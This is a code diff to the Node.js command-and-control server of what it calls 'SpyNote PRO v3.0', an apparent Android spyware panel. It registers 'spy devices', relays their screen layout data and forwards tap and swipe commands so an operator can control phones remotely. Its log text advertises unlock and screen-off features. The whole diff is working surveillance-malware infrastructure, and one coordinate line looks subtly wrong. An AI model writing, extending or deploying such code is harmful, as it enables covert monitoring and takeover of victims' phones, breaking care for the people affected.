@@ -8,15 +8,15 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingTimeout: 60000,
-    pingInterval: 25000,
-    maxHttpBufferSize: 100e6
+    pingTimeout: 30000,
+    pingInterval: 10000,
+    maxHttpBufferSize: 100e6 // 100MB for HD + Layout
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '200mb' }));
-app.use(express.urlencoded({ limit: '200mb', extended: true }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
 const devices = new Map();
 
@@ -25,7 +25,7 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Client connected:', socket.id);
+    console.log('🔌 Spy client connected:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
@@ -37,7 +37,7 @@ io.on('connection', (socket) => {
                 lastSeen: Date.now()
             });
             socket.join(`device_${deviceId}`);
-            console.log('📱 FULL CONTROL device:', deviceId, deviceInfo.model);
+            console.log('📱 SPY DEVICE:', deviceId, deviceInfo.model, deviceInfo.capabilities);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
@@ -50,18 +50,27 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('layout-tree', (layoutData) => {
+    // 🔥 LAYOUT DATA RELAY
+    socket.on('layout-data', (layoutData) => {
         const deviceId = layoutData.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(`device_${deviceId}`).emit('layout-tree', layoutData);
+            socket.to(`device_${deviceId}`).emit('layout-data', layoutData);
         }
     });
 
     socket.on('control', (controlData) => {
-        const { deviceId, action, ...data } = controlData;
+        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
         if (devices.has(deviceId)) {
-            socket.to(`device_${deviceId}`).emit('control', { action, ...data });
-            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)}`);
+            socket.to(`device_${deviceId}`).emit('control', {
+                action,
+                x: parseFloat(x) || 0,
+                y: parseFloat(y) || 0,
+                startX: parseFloat(startX) || 0,
+                startY: parseFloat(startY) || 0,
+                endX: parseFloat(endX) || endY || 0,
+                endY: parseFloat(endY) || 0
+            });
+            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
         }
     });
 
@@ -70,17 +79,18 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
+                console.log('📱 Spy device OFFLINE:', deviceId);
                 break;
             }
         }
     });
 });
 
-// Keepalive
+// Keep-alive
 setInterval(() => {
     const now = Date.now();
     for (const [deviceId, info] of devices.entries()) {
-        if (info.connected && (now - info.lastSeen > 60000)) {
+        if (info.connected && (now - info.lastSeen > 45000)) {
             devices.set(deviceId, { ...info, connected: false });
             io.emit('devices-update', Array.from(devices.entries()));
         }
@@ -89,7 +99,7 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 SpyNote PRO v3.0 on port ${PORT}`);
-    console.log(`🌐 http://localhost:${PORT}`);
-    console.log(`✅ LAYOUT + UNLOCK + SCREEN OFF READY`);
+    console.log(`🚀 SpyNote PRO v3.0 - LAYOUT SPY running on port ${PORT}`);
+    console.log(`🌐 Web: http://localhost:${PORT}`);
+    console.log(`📱 Screenshot + Layout + Perfect Controls READY!`);
 });
